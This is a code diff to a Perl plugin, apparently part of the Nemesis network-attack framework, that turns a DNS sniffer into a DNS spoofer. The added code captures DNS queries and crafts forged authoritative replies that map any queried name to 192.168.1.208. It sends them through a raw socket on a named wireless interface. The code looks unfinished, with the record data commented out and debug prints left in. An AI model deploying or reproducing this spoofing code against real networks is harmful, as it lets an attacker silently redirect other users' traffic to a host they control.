@@ -6,10 +6,10 @@ use Nemesis::Inject;
 # moduli per la gestione dei pacchetti
 use Net::Frame;
 use Net::Frame::Simple;
+use Net::Frame::Layer::ETH qw(:consts);
 use Net::Frame::Layer::IPv4 qw(:consts);
 use Net::Frame::Layer::UDP qw(:consts);
-
-use Net::DNS::Packet;
+use Net::Frame::Layer::DNS qw(:consts);
 use Data::Dumper;
 
 use NetPacket::UDP;
@@ -26,24 +26,13 @@ class Plugin::DNSSniffer {
 
     nemesis_module;
 
-    has 'Sniffer' => (
-        is => 'rw'
-    );
-
     method start() {
 
       if($self->Init->checkroot()){
         $self->Init->getIO()->print_alert("You need root permission to do this; otherwise you wouldn't see anything");
       }
-          my $Process=$self->Init->getModuleLoader->loadmodule("Process");
-          my $Monitor=$self->Init->getModuleLoader->loadmodule("Monitor");
-
-            $Process->set(
-                type=> "thread",
-                instance=>$Monitor
-                );
-            $Process->start();
-            $self->Sniffer($Process);
+      my $LiveSniffer=$Init->ml->getInstance("LiveSniffer");
+         $LiveSniffer->start()
     }
 
     method clear(){
@@ -51,92 +40,152 @@ class Plugin::DNSSniffer {
     }
 
     method stop(){
-        $self->Sniffer()->destroy() if($self->Sniffer);
+        #$self->Sniffer()->destroy() if($self->Sniffer);
     }
 
 
-    method event_udp(@Info){
+    method event_udp($Packet){
         my $IO = $Init->io;
         #$Init->io->info(__PACKAGE__." Received a UDP package");
+
+        my $eth;
+        my $eth_custom;
         my $ipv4;
+        my $ipv4_custom;
         my $udp;
-        #my $dns;
-        foreach my $Packet (@Info){
-            if( $Packet->isa("NetPacket::IP") ) {
-                my $InfoIP=Net::IP->new($Packet->{src_ip});
-                my $SrcType=$InfoIP->iptype;
-                $InfoIP=Net::IP->new($Packet->{dest_ip});
-                my $DstType=$InfoIP->iptype;                  
-                ######$self->Init->getIO()->print_info("IP packet: ".$Packet->{src_ip}."(".$SrcType.") -> ".$Packet->{dest_ip}."(".$DstType.")");
+        my $udp_custom;
+        my $dns;
+        my $dns_custom;
+        my $dnsQ;
+        my $dnsR_custom;
 
-                # Build IPv4 header
-                #$ip = Net::Packet::IPv4->new(dst => $Packet->{src_ip}, src => "192.168.1.19");
 
-                $ipv4   = Net::Frame::Layer::IPv4->new(
-                 #src => "192.168.1.4",
-                 src => $Packet->{dest_ip} ,
-                 dst => $Packet->{src_ip},
-                );
- 
-            } elsif( $Packet->isa("NetPacket::UDP") ) {
-                if($Packet->{dest_port} eq "53"){
+        #$self->Init->getIO()->print_info( $Packet );
+        #$self->Init->getIO()->print_info( $Packet->firstLayer );
+        $eth = $Packet->ref->{ETH};
+        $ipv4 = $Packet->ref->{IPv4};
+        $udp = $Packet->ref->{UDP};
+        $dns = $Packet->ref->{DNS};
+        $dnsQ = $Packet->ref->{'DNS::Question'};
 
-                    if ($Packet->{len}) {
-                        my $payload2 = $Packet->{data};
-                        my $test = Net::DNS::Packet->new(\$payload2);
-                        if ($test) {
-                            my @answer = $test->question;
-                            ######$self->Init->getIO()->print_info("ANSWER: ". $test->print);
-                        } else {
-                            $self->Init->getIO()->print_info( "no Net::DNS::Packet \n");}
-                        
-                    my @question = $test->question;
-                    my $headerId = $test->header->id;
+        # if($udp->src eq "53"){
+        #     $self->Init->getIO()->print_info("-->PACCHETTO<--\n");
+        #     $self->Init->getIO()->print_info($Packet->print . "\n");
+        # }
 
-                    $self->Init->getIO()->print_info("UDP packet: ".$Packet->{src_port}." -> ".$Packet->{dest_port});
-                    foreach my $q (@question) {
-                        $self->Init->getIO()->print_info($q->string);
-                    }
-                    $self->Init->getIO()->print_info("ID: ". $headerId);
 
-                    }
-                    # Build UDP header
-                    #$udp = Net::Packet::UDP->new(dst => $Packet->{src_port}, src => $Packet->{dest_port});
-                    $udp = Net::Frame::Layer::UDP->new(
-                        src      => $Packet->{dest_port},
-                        dst      => $Packet->{src_port},
-                    );
+        
+        if($eth->isa("Net::Frame::Layer::ETH")){
+            $eth_custom = Net::Frame::Layer::ETH->new(
+                                    src  => $eth->dst,
+                                    dst  => $eth->src,
+                                    type => NF_ETH_TYPE_IPv4,
+            );
 
-                    #build an DNS header
-                    # use Net::Frame::Layer::DNS qw(:consts);
- 
-                    # $dns = Net::Frame::Layer::DNS->new(
-                    #                                    id      => # ci devo mettere l'id della richiesta dns della vittima,
-                    #                                    qr      => NF_DNS_QR_RESPONSE, # messaggio dns di risposta (corrisposnde a valore booleano 1)
-                    #                                    opcode  => NF_DNS_OPCODE_QUERY, # deve avere lo stesso valore dello stesso campo presente nel pacchetto dns di richiesta
-                    #                                    flags   => NF_DNS_FLAGS_AA,
-                    #                                    rcode   => NF_DNS_RCODE_NOERROR, # deve essere a NOERROR o a zero per indicare che non ci sono stati errori nella richiesta
-                    #                                    qdCount => 1, # n° di entry nella sezione quetion
-                    #                                    anCount => 0, # n° di entry nella sezione response
-                    #                                    nsCount => 0, # n° of name server resource records in the authority records section.
-                    #                                    arCount => 0, # n° of resource records in the additional records section.
-                    #                                     );
-
-                    # Riassembla il frame
-
-                    # my $frame = Net::Packet::Frame->new(l3 => $ip, l4 => $udp);
-                    # $frame->send;
-                    my $packet = Net::Frame::Simple->new(
-                                                            layers => [$ipv4, $udp]
-                                                        ); 
-                    ######$self->Init->getIO()->print_info($packet->print . "\n"); 
-                    $packet->pack;
-                    # $packet->send;  # ?? come si invia ??              
-                }
-            }else {
-                #  $self->Init->io()->debug_dumper(\$Packet);
-            }
         }
+
+        # creazione layer 3 (IP)
+        if( $ipv4->isa("Net::Frame::Layer::IPv4") ) {
+
+            $ipv4_custom = Net::Frame::Layer::IPv4->new(
+                id => $ipv4->id,
+                src => $ipv4->dst,
+                dst => $ipv4->src
+                );
+
+            #$self->Init->getIO()->print_info( $ipv4->print );
+            #$self->Init->getIO()->print_info( $ipv4_custom->print );
+ 
+        } 
+
+        #creazione layer 4 (UDP)
+        if( $udp->isa("Net::Frame::Layer::UDP") ) {
+
+                if($udp->dst eq "53"){
+
+                    # Creazione layer UDP
+                    $udp_custom = Net::Frame::Layer::UDP->new(
+                        src      => $udp->dst,
+                        dst      => $udp->src
+                    );
+                    #$self->Init->getIO()->print_info( $udp->print );
+                    #$self->Init->getIO()->print_info( $udp_custom->print );
+
+                    # creazione layer DNS
+                    if($dns->isa("Net::Frame::Layer::DNS")){
+
+                        #build an DNS header
+                        $dns_custom = Net::Frame::Layer::DNS->new(
+                                                       id      => $dns->id,
+                                                       qr      => NF_DNS_QR_RESPONSE, #messaggio dns di risposta (corrisposnde a valore booleano 1)
+                                                       opcode  => $dns->opcode, # deve avere lo stesso valore dello stesso campo presente nel pacchetto dns di richiesta
+                                                       flags   => NF_DNS_FLAGS_AA,
+                                                       rcode   => NF_DNS_RCODE_NOERROR, # deve essere a NOERROR o a zero per indicare che non ci sono stati errori nella richiesta
+                                                       qdCount => 1, # n° di entry nella sezione question
+                                                       anCount => 1, # n° di entry nella sezione response
+                                                       nsCount => 0, # n° of name server resource records in the authority records section.
+                                                       arCount => 0, # n° of resource records in the additional records section.
+                                                        );
+                        #$self->Init->getIO()->print_info( $dns->print );
+                        #$self->Init->getIO()->print_info( $dns_custom->print );
+
+                        if($dnsQ->isa("Net::Frame::Layer::DNS::Question")){
+                            use Net::Frame::Layer::DNS::RR qw(:consts);
+
+                            # indirizzo ip sul quale associare la richiesta  
+                            my $rdata = Net::Frame::Layer::DNS::RR::A->new(
+                                                            address => '192.168.1.208',
+                                                        );
+                            $self->Init->getIO()->print_info("-->PASSO 1<--\n");
+                            # creazione di un record RR
+                            my $dnsR_custom = Net::Frame::Layer::DNS::RR->new(
+                                                           name     => $dnsQ->name,
+                                                           type     => NF_DNS_TYPE_A,
+                                                           class    => NF_DNS_CLASS_IN,
+                                                           ttl      => 3600,
+                                                           rdlength => $rdata->getLength,
+                                                           #rdata    => $rdata->pack,
+                                                        );
+                            $self->Init->getIO()->print_info("-->PASSO 2<--\n");
+
+
+                        
+
+
+                            # Riassembla il frame
+                            my $packet_custom = Net::Frame::Simple->new(
+                                                                layers => [$eth_custom, $ipv4_custom, $udp_custom, $dns_custom, $dnsQ, $dnsR_custom, $rdata]
+                                                            );
+
+
+                            $self->Init->getIO()->print_info("-->PACCHETTO<--\n");
+                            $self->Init->getIO()->print_info($Packet->print . "\n");
+                            $self->Init->getIO()->print_info("-->PACCHETTO CUSTOMIZZATO<--\n");
+                            $self->Init->getIO()->print_info($packet_custom->print . "\n"); 
+
+
+                            use Net::Write::Layer qw(:constants);
+                            use Net::Write::Layer3;
+     
+                            my $oWrite = Net::Write::Layer3->new(
+                                                             dst => $ipv4_custom->dst,
+                                                             dev => 'wlp2s0',
+                                                             protocol => NW_IPPROTO_UDP); # bisogna aggiungerlo nel caso di pacchetti UDP
+                            $oWrite->open;
+     
+                            # We send the frame
+                            $packet_custom->send($oWrite);
+
+     
+                            $oWrite->close;
+                        }
+                    }
+                }
+        
+        }else {
+                #  $self->Init->io()->debug_dumper(\$Packet);
+        }
+        
     }
 
 }
